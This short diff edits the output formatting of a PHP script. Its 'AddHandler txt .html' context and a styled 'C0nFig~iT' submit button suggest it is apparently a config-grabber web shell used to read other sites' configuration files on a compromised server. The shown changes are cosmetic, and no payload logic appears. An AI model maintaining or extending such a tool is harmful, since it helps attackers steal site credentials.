@@ -630,8 +630,7 @@ AddHandler txt .html
                     while (list($key, $val) = each($ara)) {
                         print "$val:";
                     }
-                    print "
-";
+                    echo "\r\n";
                 }
             }
         }
@@ -641,8 +640,7 @@ AddHandler txt .html
 <input name="m" size="80" value="C0nFig~iT" type="submit" style="border:1px dotted red; width: 99; font-family:Tahoma; font-size:10pt; color:red; text-transform:uppercase; height:23; background-color:#000000"/></br>
 </form>';
     }
-    echo '</body>
-</html>';
+    echo '</body></html>';
 }
 ?>
 
